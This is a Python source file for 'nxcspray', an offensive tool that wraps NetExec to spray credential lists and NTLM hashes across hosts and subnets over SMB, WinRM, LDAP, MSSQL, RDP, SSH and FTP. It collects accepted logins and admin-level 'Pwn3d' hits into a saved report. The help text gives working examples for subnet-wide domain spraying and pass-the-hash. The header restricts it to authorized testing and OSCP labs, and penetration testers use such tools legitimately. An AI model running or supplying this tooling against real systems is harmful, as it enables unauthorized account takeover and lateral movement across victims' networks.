#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
nxcspray  —  credential spraying orchestrator over NetExec (nxc)
Author : frx arfath  (https://github.com/frxarfath14)
License: MIT  —  authorized penetration testing / OSCP labs ONLY

Sprays a set of credentials across many hosts and many protocols
(SMB / WinRM / LDAP / MSSQL / RDP / WMI  +  SSH / FTP), then prints a
clean colour-coded summary that clearly separates:

    [VALID]  credentials accepted            (nxc  [+]  )
    [PWNED]  credentials + admin/root access  (nxc  (Pwn3d!) )

It is a thin, correct wrapper around NetExec — it does not re-implement
auth, it just drives nxc properly (including --local-auth) and PARSES its
output reliably so valid/pwned results are never missed.
"""

import argparse
import os
import re
import shutil
import subprocess
import sys
import tempfile
from datetime import datetime

# ----------------------------------------------------------------------
#  Colours (colorama if present, graceful ANSI fallback otherwise)
# ----------------------------------------------------------------------
try:
    from colorama import Fore, Style, init as _cinit
    _cinit(autoreset=True)
    C = {
        "reset": Style.RESET_ALL, "bold": Style.BRIGHT,
        "red": Fore.RED, "green": Fore.GREEN, "yellow": Fore.YELLOW,
        "blue": Fore.BLUE, "cyan": Fore.CYAN, "magenta": Fore.MAGENTA,
        "white": Fore.WHITE,
    }
except Exception:  # colorama missing → raw ANSI (still works on most terminals)
    _A = lambda n: "\033[%sm" % n
    C = {
        "reset": _A(0), "bold": _A(1),
        "red": _A(91), "green": _A(92), "yellow": _A(93),
        "blue": _A(94), "cyan": _A(96), "magenta": _A(95), "white": _A(97),
    }


def c(text, *colors):
    """Wrap text in the requested colours."""
    return "".join(C[x] for x in colors) + str(text) + C["reset"]


# ----------------------------------------------------------------------
#  Banner
# ----------------------------------------------------------------------
def banner():
    art = r"""
    ███╗   ██╗██╗  ██╗ ██████╗███████╗██████╗ ██████╗  █████╗ ██╗   ██╗
    ████╗  ██║╚██╗██╔╝██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
    ██╔██╗ ██║ ╚███╔╝ ██║     ███████╗██████╔╝██████╔╝███████║ ╚████╔╝
    ██║╚██╗██║ ██╔██╗ ██║     ╚════██║██╔═══╝ ██╔══██╗██╔══██║  ╚██╔╝
    ██║ ╚████║██╔╝ ██╗╚██████╗███████║██║     ██║  ██║██║  ██║   ██║
    ╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝
    """
    lines = art.split("\n")
    palette = ["cyan", "blue", "magenta", "green", "yellow", "red"]
    for i, ln in enumerate(lines):
        print(c(ln, palette[i % len(palette)], "bold"))

    # ---- big rainbow author name ----
    rainbow = ["red", "yellow", "green", "cyan", "blue", "magenta"]
    name = "F R X   A R F A T H"
    colored_name = "".join(
        c(ch, rainbow[i % len(rainbow)], "bold") for i, ch in enumerate(name)
    )
    bar = c("═" * 60, "blue")
    print("        " + bar)
    print("            " + c("⚡ coded by  ", "white", "bold") + colored_name + c("  ⚡", "yellow", "bold"))
    print("        " + bar)

    print(c("        credential spraying over NetExec  ", "white", "bold") +
          c("·  Windows / AD / Linux", "cyan"))
    print(c("        github: ", "white") + c("github.com/frxarfath14", "green", "bold") +
          c("   ·  Mohammed Arfath", "magenta"))
    print(c("        ⚠  authorized testing / OSCP labs only", "yellow") + "\n")


# ----------------------------------------------------------------------
#  NetExec backend detection
# ----------------------------------------------------------------------
def find_backend(preferred=None):
    """Return the path/name of an available NetExec-compatible binary."""
    candidates = [preferred] if preferred else []
    candidates += ["nxc", "netexec", "crackmapexec", "cme"]
    for b in candidates:
        if b and shutil.which(b):
            return b
    return None


# ----------------------------------------------------------------------
#  Result bookkeeping
# ----------------------------------------------------------------------
class Results:
    def __init__(self):
        self.valid = []   # (proto, host, cred)
        self.pwned = []   # (proto, host, cred)

    def add_valid(self, proto, host, cred):
        row = (proto, host, cred)
        if row not in self.valid:
            self.valid.append(row)

    def add_pwned(self, proto, host, cred):
        row = (proto, host, cred)
        if row not in self.pwned:
            self.pwned.append(row)


# nxc success line looks like:
#   SMB  10.10.10.10  445  DC01  [+] domain.local\user:pass (Pwn3d!)
#   SSH  10.10.10.20  22   host  [+] user:pass  Linux - ...
# Regex: capture protocol, host, and the credential portion after [+].
LINE_RE = re.compile(
    r"^\s*(?P<proto>[A-Z]+)\s+(?P<host>[0-9a-fA-F:\.]+)\s+\d+\s+\S+\s+\[\+\]\s+(?P<cred>.+?)\s*$"
)
PWN_MARKERS = ("(Pwn3d!)", "Pwn3d!", "(Admin!)")


def parse_line(line, results):
    """
    Inspect one line of nxc output.
    Returns a tuple (kind, colored_line) where kind in {"pwned","valid","fail","info",None}.
    """
    # strip any ANSI colour nxc itself may have emitted, for clean matching
    clean = re.sub(r"\033\[[0-9;]*m", "", line).rstrip("\n")

    if "[+]" in clean:
        m = LINE_RE.match(clean)
        proto = host = "?"
        cred = clean.split("[+]", 1)[1].strip()
        if m:
            proto = m.group("proto")
            host = m.group("host")
            cred = m.group("cred")
        is_pwned = any(mk in clean for mk in PWN_MARKERS)
        if is_pwned:
            results.add_pwned(proto, host, cred)
            tag = c(" [PWNED] ", "red", "bold")
            return "pwned", tag + c(clean, "red", "bold")
        else:
            results.add_valid(proto, host, cred)
            tag = c(" [VALID] ", "green", "bold")
            return "valid", tag + c(clean, "green")

    if "[-]" in clean:
        return "fail", c(clean, "white")          # dim-ish failure
    if "[*]" in clean:
        return "info", c(clean, "blue")           # nxc info
    if clean.strip():
        return None, c(clean, "white")
    return None, ""


# ----------------------------------------------------------------------
#  Command building + running
# ----------------------------------------------------------------------
WIN_PROTOS = ("smb", "winrm", "wmi", "mssql", "rdp")


def build_cmd(backend, proto, target, args, users_arg, pass_arg, local_auth=False):
    cmd = [backend, proto, target]
    cmd += users_arg
    cmd += pass_arg
    if local_auth and proto in WIN_PROTOS:
        cmd.append("--local-auth")
    if args.domain and proto in ("smb", "winrm", "ldap", "wmi", "mssql", "rdp"):
        cmd += ["-d", args.domain]
    if args.no_bruteforce:
        cmd.append("--no-bruteforce")
    if args.continue_on_success:
        cmd.append("--continue-on-success")
    else:
        # default ON for spraying — we want every host checked
        cmd.append("--continue-on-success")
    if args.threads:
        cmd += ["-t", str(args.threads)]
    if args.extra:
        cmd += args.extra.split()
    return cmd


def cred_args(args):
    """Return (users_arg_list, pass_arg_list) for nxc based on user input."""
    users = []
    passes = []
    if args.userfile:
        users = ["-u", args.userfile]
    elif args.user:
        users = ["-u"] + args.user
    if args.hashfile:
        passes = ["-H", args.hashfile]
    elif args.hash:
        passes = ["-H"] + args.hash
    elif args.passfile:
        passes = ["-p", args.passfile]
    elif args.password is not None:
        passes = ["-p"] + args.password
    else:
        passes = ["-p", ""]  # allow null-session / no-pass checks
    return users, passes


def run_spray(args):
    backend = find_backend(args.backend)
    if not backend:
        print(c("[!] NetExec not found. Install it first:", "red", "bold"))
        print(c("    pipx install netexec     (or: apt install netexec)", "yellow"))
        sys.exit(1)

    banner()
    print(c(f"[*] backend    : {backend}", "cyan"))
    print(c(f"[*] protocols  : {', '.join(args.protocols)}", "cyan"))
    print(c(f"[*] targets    : {args.target}", "cyan"))
    if args.both:
        print(c("[*] auth mode  : BOTH — domain + local-auth on every Windows protocol", "magenta", "bold"))
    elif args.local_auth:
        print(c("[*] auth mode  : LOCAL (SAM) auth on Windows protocols", "magenta", "bold"))
    else:
        print(c("[*] auth mode  : DOMAIN (add --both to also try local-auth)", "magenta"))
    print(c(f"[*] started    : {datetime.now():%Y-%m-%d %H:%M:%S}", "cyan"))
    print(c("-" * 70, "blue"))

    users_arg, pass_arg = cred_args(args)
    results = Results()

    for proto in args.protocols:
        # decide which auth modes to run for this protocol
        if proto in WIN_PROTOS:
            if args.both:
                modes = [("domain", False), ("local", True)]
            elif args.local_auth:
                modes = [("local", True)]
            else:
                modes = [("domain", False)]
        elif proto == "ldap":
            modes = [("ldap-note", False)]   # LDAP: directory/domain only, local-auth N/A
        else:
            modes = [("svc-note", False)]    # ssh/ftp/vnc: local-auth doesn't apply

        for mode_name, la in modes:
            label = f"  ▶  spraying {proto.upper()}"
            if mode_name in ("domain", "local"):
                label += f"  ({mode_name} auth)"
            elif mode_name == "ldap-note":
                label += "  (domain directory — local-auth N/A)"
            elif mode_name == "svc-note":
                label += "  (single run — local-auth N/A)"
            label += "  "
            print(c(label.ljust(70, "─"), "yellow", "bold"))
            cmd = build_cmd(backend, proto, args.target, args, users_arg, pass_arg, local_auth=la)
            if args.verbose:
                print(c("    $ " + " ".join(cmd), "blue"))
            try:
                proc = subprocess.Popen(
                    cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, bufsize=1,
                )
                section_hit = False
                for line in proc.stdout:
                    kind, out = parse_line(line, results)
                    if not out:
                        continue
                    if kind in ("valid", "pwned"):
                        section_hit = True
                    if kind == "fail" and not args.verbose:
                        continue
                    print("    " + out)
                proc.wait()
                if not section_hit:
                    print(c("    — tried, no valid creds here —", "white"))
            except FileNotFoundError:
                print(c(f"    [!] protocol '{proto}' not supported by {backend}", "red"))
            except KeyboardInterrupt:
                print(c("\n[!] interrupted by user", "red", "bold"))
                summary(results, args)
                return
            print()

    summary(results, args)


# ----------------------------------------------------------------------
#  Summary
# ----------------------------------------------------------------------
def summary(results, args):
    print(c("=" * 70, "blue"))
    print(c("  SPRAY SUMMARY  — frx arfath", "white", "bold"))
    print(c("=" * 70, "blue"))

    if results.pwned:
        print(c(f"\n  [PWNED]  {len(results.pwned)} admin/root hit(s):", "red", "bold"))
        for proto, host, cred in results.pwned:
            print("    " + c("💀 ", "red") +
                  c(f"{proto:<6}", "magenta", "bold") +
                  c(f"{host:<18}", "yellow") +
                  c(cred, "red", "bold"))
    else:
        print(c("\n  [PWNED]  none", "white"))

    if results.valid:
        print(c(f"\n  [VALID]  {len(results.valid)} accepted credential(s):", "green", "bold"))
        for proto, host, cred in results.valid:
            print("    " + c("✔ ", "green") +
                  c(f"{proto:<6}", "cyan") +
                  c(f"{host:<18}", "yellow") +
                  c(cred, "green"))
    else:
        print(c("\n  [VALID]  none", "white"))

    total = len(results.valid) + len(results.pwned)
    print(c("\n" + "-" * 70, "blue"))
    print(c(f"  total hits: {total}   (pwned: {len(results.pwned)}, valid-only: {len(results.valid)})",
            "white", "bold"))
    print(c("-" * 70, "blue"))

    if args.output and total:
        try:
            with open(args.output, "w") as fh:
                fh.write("# nxcspray results — frx arfath\n")
                for proto, host, cred in results.pwned:
                    fh.write(f"PWNED\t{proto}\t{host}\t{cred}\n")
                for proto, host, cred in results.valid:
                    fh.write(f"VALID\t{proto}\t{host}\t{cred}\n")
            print(c(f"  [*] results saved -> {args.output}", "cyan"))
        except OSError as e:
            print(c(f"  [!] could not write {args.output}: {e}", "red"))


# ----------------------------------------------------------------------
#  CLI
# ----------------------------------------------------------------------
DEFAULT_PROTOCOLS = ["smb", "winrm", "ldap", "mssql", "rdp", "ssh", "ftp"]


def parse_args():
    p = argparse.ArgumentParser(
        prog="nxcspray",
        description="Credential spraying over NetExec — Windows / AD / Linux.  by frx arfath",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=c("""
examples:
  # single cred, all default protocols, one host
  nxcspray -t 10.10.10.10 -u admin -p 'Passw0rd!'

  # spray a user list + pass list over a whole subnet, LOCAL auth
  nxcspray -t 10.10.10.0/24 -U users.txt -P passwords.txt --local-auth

  # domain spray, only smb + winrm + ldap
  nxcspray -t 10.10.10.0/24 -U users.txt -p 'Summer2026!' -d corp.local --protocols smb winrm ldap

  # pass-the-hash across hosts
  nxcspray -t targets.txt -u administrator -H aad3b435...:31d6cfe0... --local-auth

  # paired user:pass lists (line-by-line, not full matrix)
  nxcspray -t 10.10.10.10 -U users.txt -P pass.txt --no-bruteforce
""", "cyan"),
    )
    p.add_argument("-t", "--target", required=True,
                   help="target IP / CIDR / hostname, or a file of targets (nxc accepts a file path)")

    g_u = p.add_mutually_exclusive_group()
    g_u.add_argument("-u", "--user", nargs="+", help="username(s)")
    g_u.add_argument("-U", "--userfile", help="file with usernames (one per line)")

    g_p = p.add_mutually_exclusive_group()
    g_p.add_argument("-p", "--password", nargs="+", help="password(s)")
    g_p.add_argument("-P", "--passfile", help="file with passwords (one per line)")
    g_p.add_argument("-H", "--hash", nargs="+", help="NTLM hash(es) for pass-the-hash")
    g_p.add_argument("--hashfile", help="file with NTLM hashes")

    p.add_argument("--protocols", nargs="+", default=DEFAULT_PROTOCOLS,
                   metavar="PROTO",
                   help="protocols to spray (default: %(default)s). "
                        "choices: smb winrm ldap mssql rdp wmi ssh ftp vnc")
    p.add_argument("--local-auth", action="store_true",
                   help="use LOCAL (SAM) account auth on Windows protocols instead of domain")
    p.add_argument("--both", action="store_true",
                   help="spray each Windows protocol BOTH ways — domain AND local-auth "
                        "(recommended: never miss local admin creds)")
    p.add_argument("-d", "--domain", help="domain name for AD spraying")
    p.add_argument("--no-bruteforce", action="store_true",
                   help="pair user/pass line-by-line instead of full matrix")
    p.add_argument("--continue-on-success", action="store_true",
                   help="keep going after a hit (default: on for spraying)")
    p.add_argument("-T", "--threads", type=int, help="nxc threads")
    p.add_argument("--backend", help="force backend binary (nxc / netexec / crackmapexec)")
    p.add_argument("-o", "--output", help="save VALID/PWNED results to a file")
    p.add_argument("-x", "--extra", help="extra raw args passed straight to nxc (quoted)")
    p.add_argument("-v", "--verbose", action="store_true",
                   help="show the nxc command and failed attempts too")
    return p.parse_args()


def main():
    args = parse_args()
    valid_protos = {"smb", "winrm", "ldap", "mssql", "rdp", "wmi", "ssh", "ftp", "vnc"}
    bad = [x for x in args.protocols if x not in valid_protos]
    if bad:
        print(c(f"[!] unknown protocol(s): {', '.join(bad)}", "red", "bold"))
        print(c(f"    valid: {', '.join(sorted(valid_protos))}", "yellow"))
        sys.exit(2)
    if not (args.user or args.userfile):
        print(c("[!] no username given. use -u USER or -U users.txt", "red", "bold"))
        sys.exit(2)
    try:
        run_spray(args)
    except KeyboardInterrupt:
        print(c("\n[!] aborted", "red", "bold"))
        sys.exit(130)


if __name__ == "__main__":
    main()
